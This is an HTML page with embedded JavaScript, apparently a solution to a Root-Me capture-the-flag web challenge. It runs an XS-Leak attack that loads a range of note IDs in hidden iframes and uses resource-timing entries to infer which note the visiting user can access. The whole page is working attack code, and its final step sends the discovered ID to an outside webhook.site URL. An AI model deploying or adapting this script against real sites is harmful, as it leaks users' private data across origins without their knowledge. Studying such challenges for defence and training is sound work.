<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak: Resource Detection</title>
</head>
<body>
    <h1>Scanning notes...</h1>
    <div id="status"></div>
    <script>
        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
        const START_ID = 1378;
        const END_ID = 2000;
        const DELAY_MS = 500;
        const IFRAME_TIMEOUT = 2000;

        const CSS_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
        const JS_URL  = 'https://web-client-ch56.challenge01.root-me.org:58056/static/js/main.js';

        function updateStatus(msg) {
            const div = document.getElementById('status');
            div.innerHTML += msg + '<br>';
            console.log(msg);
        }

        // Check if a specific resource was loaded during iframe loading
        function resourceLoaded(url, beforeTime) {
            const entries = performance.getEntriesByType('resource');
            for (let e of entries) {
                if (e.name === url && e.startTime > beforeTime) {
                    return true;
                }
            }
            return false;
        }

        // Measure whether the target page loads the CSS/JS resources
        async function checkResources(id) {
            return new Promise((resolve) => {
                const url = TARGET_BASE + id;
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = url;
                const beforeTime = performance.now();
                let resolved = false;

                const timeout = setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        document.body.removeChild(iframe);
                        const hasCSS = resourceLoaded(CSS_URL, beforeTime);
                        const hasJS  = resourceLoaded(JS_URL, beforeTime);
                        updateStatus(`ID ${id}: CSS=${hasCSS}, JS=${hasJS}`);
                        resolve(hasCSS || hasJS);
                    }
                }, IFRAME_TIMEOUT);

                iframe.onload = () => {
                    clearTimeout(timeout);
                    if (resolved) return;
                    resolved = true;
                    // Give subresources a moment to load
                    setTimeout(() => {
                        const hasCSS = resourceLoaded(CSS_URL, beforeTime);
                        const hasJS  = resourceLoaded(JS_URL, beforeTime);
                        updateStatus(`ID ${id}: CSS=${hasCSS}, JS=${hasJS}`);
                        document.body.removeChild(iframe);
                        resolve(hasCSS || hasJS);
                    }, 200);
                };
                document.body.appendChild(iframe);
            });
        }

        async function run() {
            updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
            for (let id = START_ID; id <= END_ID; id++) {
                // Clear previous performance entries
                performance.clearResourceTimings();
                const hasResources = await checkResources(id);
                if (hasResources) {
                    updateStatus(`✅ Found note ID: ${id}`);
                    new Image().src = `${WEBHOOK}?id=${id}`;
                    break; // remove break to continue scanning
                }
                await new Promise(r => setTimeout(r, DELAY_MS));
            }
            updateStatus('Scan complete.');
        }

        run();
    </script>
</body>
</html>
